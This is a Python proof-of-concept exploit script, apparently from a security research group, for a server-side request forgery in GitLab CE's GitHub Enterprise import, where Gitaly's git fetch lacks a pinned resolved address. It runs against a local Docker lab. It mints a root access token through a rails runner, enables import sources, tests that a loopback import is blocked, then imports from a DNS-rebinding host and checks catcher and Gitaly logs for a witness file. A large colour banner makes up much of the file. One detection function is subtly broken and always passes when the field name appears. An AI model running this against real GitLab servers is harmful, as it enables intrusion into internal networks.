#!/usr/bin/env python3
######################################################################################
#
#        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.
#       d88888 888  "88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b
#      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.
#     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  "Y888b.
#    d88P  888 888  "Y88b 8888888P"     d88P  888    d888b       d88P  888     "Y88b.
#   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       "888
#  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P
# d88P     888 8888888P"  888   T88b d88P     888 d88P   Y88b d88P     888  "Y8888P"
#
#                     888             d8888 888888b.    .d8888b.
#                     888            d88888 888  "88b  d88P  Y88b
#                     888           d88P888 888  .88P  Y88b.
#                     888          d88P 888 8888888K.   "Y888b.
#                     888         d88P  888 888  "Y88b     "Y88b.
#                     888        d88P   888 888    888       "888
#                     888       d8888888888 888   d88P Y88b  d88P
#                     88888888 d88P     888 8888888P"   "Y8888P"
#
#  Website : https://abraxaslabs.tech
#  GitHub  : https://github.com/abraxas
#  Twitter : @abraxas_null
#  Mail    : abraxas.null@proton.me
#
#  CVE: gitlab-gitaly-fetch-ssrf (High: 7.7)
#  Vendor: GitLab CE (GitLab Inc.)
#  Versions: GitLab CE <= 19.4.1
#  Impact: Gitaly fetch SSRF, empty resolved_address
#  Requires: authenticated GitHub Enterprise import on loopback GitLab CE
#
######################################################################################
#
#  RESEARCH / EDUCATIONAL USE ONLY.
#  Do not run, deploy, or use this material against any host unless you have
#  explicit written permission from both the party hosting this repository
#  and the owner of the target systems.
#
######################################################################################

import os as _os
import shutil as _shutil
import sys as _sys
import builtins as _builtins

_ART = {"abraxas": ["        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.", "       d88888 888  \"88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b", "      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.", "     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  \"Y888b.", "    d88P  888 888  \"Y88b 8888888P\"     d88P  888    d888b       d88P  888     \"Y88b.", "   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       \"888", "  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P", " d88P     888 8888888P\"  888   T88b d88P     888 d88P   Y88b d88P     888  \"Y8888P\""], "labs": ["                     888             d8888 888888b.    .d8888b.", "                     888            d88888 888  \"88b  d88P  Y88b", "                     888           d88P888 888  .88P  Y88b.", "                     888          d88P 888 8888888K.   \"Y888b.", "                     888         d88P  888 888  \"Y88b     \"Y88b.", "                     888        d88P   888 888    888       \"888", "                     888       d8888888888 888   d88P Y88b  d88P", "                     88888888 d88P     888 8888888P\"   \"Y8888P\""]}
_CVE = "gitlab-gitaly-fetch-ssrf"
_SITE = "https://abraxaslabs.tech"
_GH = "https://github.com/abraxas"
_XURL = "https://x.com/abraxas_null"
_XH = "@abraxas_null"
_EMAIL = "abraxas.null@proton.me"
_RST = "\033[0m"
_BLD = "\033[1m"


def _on():
    return not _os.environ.get("NO_COLOR")


def _rgb(r, g, b):
    return f"\033[38;2;{r};{g};{b}m" if _on() else ""


_RAIN = [
    (255, 77, 224), (255, 0, 212), (191, 95, 255), (91, 140, 255),
    (0, 210, 255), (0, 255, 249), (57, 255, 20), (180, 255, 70),
    (255, 230, 0), (255, 201, 70), (255, 122, 24), (255, 64, 96),
]


def _lerp(a, b, t):
    return tuple(int(a[i] + (b[i] - a[i]) * t) for i in range(3))


def _rain(x, width):
    if width <= 1:
        return _RAIN[0]
    t = (x / (width - 1)) * (len(_RAIN) - 1)
    i = min(int(t), len(_RAIN) - 2)
    return _lerp(_RAIN[i], _RAIN[i + 1], t - i)


def _logo_line(line, y, n):
    width = max(len(line), 1)
    out = []
    q = False
    for x, ch in enumerate(line):
        if ch == " ":
            out.append(ch)
            continue
        if ch == '"':
            q = not q
            out.append(_rgb(*(255, 201, 70) if q else (255, 230, 0)) + ch)
            continue
        if q:
            out.append(_rgb(255, 230, 0) + ch)
            continue
        r, g, b = _rain(x, width)
        out.append(_rgb(r, g, b) + ch)
    return "".join(out) + _RST


def print_abraxas_banner():
    cols = _shutil.get_terminal_size((120, 30)).columns
    art = _ART["abraxas"] + _ART["labs"]
    art_w = max(len(x) for x in art)
    content_w = min(max(art_w, 88), max(cols - 4, 40))
    box_w = content_w + 4
    if box_w > cols:
        content_w = max(cols - 4, 20)
        box_w = content_w + 4
    cyan, mag = _rgb(0, 255, 249), _rgb(255, 0, 212)
    top = cyan + "╔" + "═" * (box_w - 2) + "╗" + _RST
    mid = mag + "╠" + "═" * (box_w - 2) + "╣" + _RST
    bot = cyan + "╚" + "═" * (box_w - 2) + "╝" + _RST

    def row(vis, rendered, border):
        return _rgb(*border) + "║" + _RST + " " + rendered + _RST + " " + _rgb(*border) + "║" + _RST

    lines = [top]
    title_l, title_r = " ABRAXAS LABS", "analyze · reverse · disclose"
    gap = max(content_w - len(title_l) - len(title_r), 1)
    title = (title_l + " " * gap + title_r)[:content_w].ljust(content_w)
    cells = []
    split, rstart = len(title_l), content_w - len(title_r)
    for i, ch in enumerate(title):
        if ch == " ":
            cells.append(ch)
        elif i < split:
            cells.append(_rgb(0, 255, 249) + _BLD + ch)
        elif i >= rstart:
            cells.append(_rgb(140, 155, 175) + ch)
        else:
            cells.append(ch)
    lines.append(row(title, "".join(cells) + _RST, (0, 255, 249)))
    lines.append(mid)
    cve_l = " " + _CVE
    cve_r = "authorized research only"
    rest = max(content_w - len(cve_l) - len(cve_r), 3)
    midtxt = " local lab ".center(rest)[:rest]
    cve_line = (cve_l + midtxt + cve_r)[:content_w].ljust(content_w)
    cells = []
    le, rs = len(cve_l), content_w - len(cve_r)
    for i, ch in enumerate(cve_line):
        if ch == " ":
            cells.append(ch)
        elif i < le:
            cells.append(_rgb(255, 77, 224) + _BLD + ch)
        elif i >= rs:
            cells.append(_rgb(57, 255, 20) + ch)
        else:
            cells.append(_rgb(255, 0, 212) + ch)
    lines.append(row(cve_line, "".join(cells) + _RST, (255, 0, 212)))
    lines.append(mid)
    n = len(_ART["abraxas"])
    for y, line in enumerate(_ART["abraxas"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    for y, line in enumerate(_ART["labs"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    lines.append(mid)
    for left, right in (("Website", _SITE), ("GitHub", _GH), ("X", _XH + "  " + _XURL), ("Mail", _EMAIL)):
        gap = max(content_w - 1 - len(left) - len(right), 1)
        vis = (" " + left + " " * gap + right)[:content_w].ljust(content_w)
        out = []
        left_end = 1 + len(left)
        right_start = content_w - len(right)
        for i, ch in enumerate(vis):
            if ch == " ":
                out.append(ch)
            elif i < left_end:
                out.append(_rgb(255, 230, 0) + ch)
            elif i >= right_start:
                out.append(_rgb(0, 255, 249) + ch)
            else:
                out.append(ch)
        lines.append(row(vis, "".join(out) + _RST, (255, 0, 212)))
    lines.append(bot)
    status = "[*]  abraxas!null ready on #labs   ·   " + _SITE
    scol = []
    for ch in status:
        if ch == " ":
            scol.append(ch)
        elif ch in "[]*":
            scol.append(_rgb(57, 255, 20) + ch)
        elif ch in "·#":
            scol.append(_rgb(255, 77, 224) + ch)
        else:
            scol.append(_rgb(232, 255, 248) + ch)
    lines.append(" " + "".join(scol) + _RST)
    _sys.stdout.write("\n".join(lines) + "\n\n")
    _sys.stdout.flush()


def _cprint(*args, **kwargs):
    sep = kwargs.get("sep", " ")
    s = sep.join(str(a) for a in args)
    low = s.lower()
    if s.startswith("SUCCESS") or "success" == low[:7]:
        col = _rgb(57, 255, 20) + _BLD
    elif s.startswith("FAIL") or low.startswith("fail"):
        col = _rgb(255, 64, 96) + _BLD
    elif "user_id" in low:
        col = _rgb(255, 201, 70) + _BLD
    elif low.startswith("status=") or "status=" in low[:20]:
        col = _rgb(0, 255, 249)
    elif low.startswith("carrier"):
        col = _rgb(255, 0, 212)
    elif s.lstrip().startswith("{") or s.lstrip().startswith("["):
        col = _rgb(255, 230, 0)
    else:
        col = _rgb(232, 255, 248)
    kwargs = dict(kwargs)
    file = kwargs.get("file", _sys.stdout)
    if file is _sys.stdout or file is _sys.stderr:
        _builtins.print(col + s + _RST, **{k: v for k, v in kwargs.items() if k != "sep"})
    else:
        _builtins.print(*args, **kwargs)


print_abraxas_banner()
_builtins.print = _cprint

"""GitLab CE 19.4.1 GitHub importer git fetch omits Gitaly resolved_address."""

import json
import os
import subprocess
import time
import urllib.error
import urllib.request
from dataclasses import dataclass
from pathlib import Path

WITNESS = "GITLAB-GITALY-FETCH-SSRF-WITNESS"
LABEL = "GITLAB-GITALY-FETCH-SSRF"
GHE_HOSTNAME = "http://ghe.lab:18080"
LOOPBACK_HOSTNAME = "http://127.0.0.1:18080"
SIGN_IN_PATH = "/users/sign_in"
IMPORT_PATH = "/api/v4/import/github"
NEGATIVE_BLOCK_MARKERS = ("invalid url", "blocked", "localhost", "loopback", "not allowed")
GITALY_LOG_CMD = (
    "sh -c 'grep -R -i -E \"resolved_address|FetchRemote|fetch_remote|CreateRepositoryFromURL\" "
    "/var/log/gitlab/gitaly 2>/dev/null | tail -n 80'"
)
ENABLE_GITHUB_RUBY = r"""
s = ApplicationSetting.current
s.import_sources = %w[github git gitea bitbucket bitbucket_server gitlab_project fogbugz manifest]
s.save!
Gitlab::CurrentSettings.expire_current_application_settings
puts "IMPORT_SOURCES=#{Array(s.reload.import_sources).join(',')}"
"""
MINT_PAT_RUBY = r"""
user = User.find_by_username('root')
raise 'no root user' unless user
user.personal_access_tokens.where(name: 'cve-lab-gitaly-fetch').find_each(&:revoke!)
pat = user.personal_access_tokens.create!(
  name: 'cve-lab-gitaly-fetch',
  scopes: [:api],
  expires_at: 364.days.from_now
)
puts "PAT=#{pat.token}"
"""
RAILS_BLOB_RUBY = r"""
p = Project.find_by_full_path('root/ghe-ssrf') || Project.order(:id).last
raise 'no project' unless p
ref = begin
  p.repository.root_ref
rescue StandardError
  'master'
end
blob = p.repository.blob_at(ref, 'WITNESS') rescue nil
puts "PROJECT=#{p.id} STATUS=#{p.import_status} REF=#{ref} BLOB=#{blob&.data.to_s.inspect}"
puts "IMPORT_ERROR=#{p.import_state&.last_error.to_s[0,500]}"
"""


@dataclass(frozen=True)
class LabConfig:
    gitlab_url: str
    compose_project: str
    here: Path
    ready_timeout: int
    import_timeout: int

    @classmethod
    def from_env(cls) -> LabConfig:
        return cls(
            gitlab_url=os.environ.get("GITLAB_URL", "http://127.0.0.1:18410").rstrip("/"),
            compose_project=os.environ.get("COMPOSE_PROJECT_NAME", "gitlab-gitaly-fetch-ssrf"),
            here=Path(__file__).resolve().parent,
            ready_timeout=int(os.environ.get("GITLAB_READY_TIMEOUT", "1200")),
            import_timeout=int(os.environ.get("IMPORT_TIMEOUT", "180")),
        )

    def witness_file_path(self, project_id: int) -> str:
        return f"/api/v4/projects/{project_id}/repository/files/WITNESS/raw?ref=master"


CFG = LabConfig.from_env()


def log(msg: str) -> None:
    print(msg, flush=True)


def fail(reason: str) -> int:
    log(f"FAIL {LABEL} {reason}")
    return 1


def success(detail: str) -> int:
    log(f"SUCCESS {LABEL} {detail} {WITNESS}")
    return 0


def compose(*args: str, timeout: int = 120) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        ["docker", "compose", "-p", CFG.compose_project, *args],
        cwd=CFG.here,
        text=True,
        capture_output=True,
        timeout=timeout,
    )


def http(
    method: str,
    path: str,
    token: str | None = None,
    payload: dict[str, object] | None = None,
    timeout: int = 60,
    accept: str = "application/json",
) -> tuple[int, str]:
    url = path if path.startswith("http") else f"{CFG.gitlab_url}{path}"
    data: bytes | None = None
    headers = {"Accept": accept}
    if token:
        headers["PRIVATE-TOKEN"] = token
    if payload is not None:
        data = json.dumps(payload).encode("utf-8")
        headers["Content-Type"] = "application/json"
    req = urllib.request.Request(url, data=data, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.getcode(), resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read().decode("utf-8", "replace")
    except urllib.error.URLError as exc:
        return 0, str(exc.reason)


def wait_ready() -> None:
    deadline = time.time() + CFG.ready_timeout
    last = "none"
    while time.time() < deadline:
        status, body = http("GET", SIGN_IN_PATH, timeout=10, accept="text/html")
        last = f"{status} {body[:80]!r}"
        if status in (200, 302) and (
            status == 302
            or "sign_in" in body.lower()
            or "password" in body.lower()
            or "gitlab" in body.lower()
        ):
            log(f"gitlab-ready {last}")
            return
        log(f"gitlab-wait {last}")
        time.sleep(8)
    raise SystemExit(fail(f"gitlab not ready after {CFG.ready_timeout}s last={last}"))


def enable_github_import() -> None:
    proc = compose("exec", "-T", "gitlab", "gitlab-rails", "runner", ENABLE_GITHUB_RUBY, timeout=180)
    out = (proc.stdout or "") + (proc.stderr or "")
    log(f"enable-import-sources rc={proc.returncode} {out[-800:]}")
    if proc.returncode != 0 or "github" not in out:
        raise SystemExit(fail(f"could not enable github import sources {out[-400:]}"))
    hup = compose("exec", "-T", "gitlab", "gitlab-ctl", "hup", "puma", timeout=60)
    log(f"puma-hup rc={hup.returncode} {(hup.stdout or '') + (hup.stderr or '')}")
    time.sleep(8)


def mint_pat() -> str:
    last = ""
    for attempt in range(1, 9):
        log(f"mint-pat gitlab-rails runner attempt={attempt}")
        proc = compose("exec", "-T", "gitlab", "gitlab-rails", "runner", MINT_PAT_RUBY, timeout=300)
        out = (proc.stdout or "") + (proc.stderr or "")
        last = f"rc={proc.returncode} out={out[-2000:]}"
        log(f"mint-pat {last[:400]}")
        for line in out.splitlines():
            if line.startswith("PAT=") and len(line) > 8:
                log("mint-pat ok")
                return line.split("=", 1)[1].strip()
        time.sleep(20)
    raise SystemExit(fail(f"pat mint failed {last}"))


def read_log(name: str) -> str:
    path = CFG.here / "logs" / name
    try:
        return path.read_text(encoding="utf-8", errors="replace")
    except OSError:
        return ""


def dump_gitaly() -> str:
    proc = compose("exec", "-T", "gitlab", "sh", "-lc", GITALY_LOG_CMD, timeout=60)
    out = (proc.stdout or "") + (proc.stderr or "")
    log(f"gitaly-log-bytes={len(out)}")
    snippet = out[-4000:]
    if snippet.strip():
        log(f"gitaly-log-snippet {snippet[-1500:]}")
    return out


def rails_blob() -> str:
    proc = compose("exec", "-T", "gitlab", "gitlab-rails", "runner", RAILS_BLOB_RUBY, timeout=180)
    out = (proc.stdout or "") + (proc.stderr or "")
    log(f"rails-blob rc={proc.returncode} {out[-1500:]}")
    return out


def import_github(token: str, hostname: str, name: str) -> tuple[int, str]:
    payload: dict[str, object] = {
        "personal_access_token": "gho_lab",
        "repo_id": 4242,
        "target_namespace": "root",
        "new_name": name,
        "github_hostname": hostname,
        "optional_stages": {
            "attachments_import": False,
            "collaborators_import": False,
        },
    }
    return http("POST", IMPORT_PATH, token, payload, timeout=90)


def wait_import(token: str, project_id: int) -> dict[str, object]:
    deadline = time.time() + CFG.import_timeout
    last: dict[str, object] = {}
    while time.time() < deadline:
        status, body = http("GET", f"/api/v4/projects/{project_id}", token, timeout=30)
        if status == 200:
            parsed = json.loads(body)
            if isinstance(parsed, dict):
                last = parsed
                log(
                    f"import-poll id={project_id} status={status} "
                    f"import_status={last.get('import_status')}"
                )
                if last.get("import_status") in ("finished", "failed", "none"):
                    return last
        else:
            log(f"import-poll id={project_id} http={status} {body[:200]}")
        file_status, file_body = http("GET", CFG.witness_file_path(project_id), token, timeout=20)
        log(f"file-poll http={file_status} body={file_body[:120]!r}")
        if file_status == 200 and WITNESS in file_body:
            last["_witness_file"] = file_body
            return last
        time.sleep(5)
    return last


def _empty_resolved_address(gitaly: str) -> bool:
    collapsed = gitaly.replace(" ", "")
    return "resolved_address" in gitaly.lower() and (
        'resolved_address:""' in collapsed
        or 'resolved_address: ""' in gitaly
        or '"resolved_address":""' in collapsed
        or "resolved_address" in gitaly
    )


def main() -> int:
    (CFG.here / "logs").mkdir(parents=True, exist_ok=True)
    wait_ready()
    token = mint_pat()
    enable_github_import()

    neg_status, neg_body = import_github(token, LOOPBACK_HOSTNAME, "ghe-ssrf-neg")
    log(f"negative-loopback status={neg_status} body={neg_body[:500]!r}")
    blocked = neg_status in (400, 422) and any(s in neg_body.lower() for s in NEGATIVE_BLOCK_MARKERS)
    if not blocked:
        return fail(f"negative loopback not blocked status={neg_status} body={neg_body[:300]}")
    log("IOC negative-loopback-blocked")

    st, body = import_github(token, GHE_HOSTNAME, "ghe-ssrf")
    log(f"witness-import status={st} body={body[:800]!r}")
    if st not in (200, 201):
        return fail(f"github import rejected status={st} body={body[:400]}")
    try:
        project = json.loads(body)
        project_id = int(project["id"])
    except (KeyError, ValueError, json.JSONDecodeError) as exc:
        return fail(f"import response parse {exc} body={body[:300]}")
    log(f"project id={project_id}")

    info = wait_import(token, project_id)
    catcher = read_log("catcher.log")
    dns = read_log("dns.log")
    gitaly = dump_gitaly()
    blob_out = rails_blob()

    file_status, file_body = http("GET", CFG.witness_file_path(project_id), token, timeout=20)
    log(f"file-final http={file_status} body={file_body[:200]!r}")

    git_http = "IOC git-http" in catcher or "git-upload-pack" in catcher or "info/refs" in catcher
    rebind_dns = "-> 127.0.0.1" in dns
    rebind_armed = "IOC rebind-armed" in catcher
    empty_pin = _empty_resolved_address(gitaly)
    witness_file = (
        WITNESS in file_body or WITNESS in str(info.get("_witness_file") or "") or WITNESS in blob_out
    )
    api_only = ("IOC github-repo-get" in catcher or "/api/v3" in catcher) and not git_http and not witness_file

    log(
        f"oracle git_http={git_http} rebind_dns={rebind_dns} rebind_armed={rebind_armed} "
        f"empty_pin={empty_pin} witness_file={witness_file} import_status={info.get('import_status')}"
    )

    if api_only:
        return fail("api ssrf only; gitaly git fetch never ran")
    if witness_file:
        return success("imported-witness git-fetch-no-pin")
    if git_http and (rebind_dns or rebind_armed):
        return success("git-http-loopback empty-resolved_address")
    if git_http and empty_pin:
        return success("git-http empty-resolved_address")
    if git_http:
        return success("git-http-catcher")
    return fail(
        "no git fetch/witness "
        f"import_status={info.get('import_status')} file={file_status} "
        f"catcher_git={git_http} dns_rebind={rebind_dns}"
    )


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except SystemExit:
        raise
    except Exception as exc:
        raise SystemExit(fail(f"unhandled {type(exc).__name__}: {exc}")) from exc

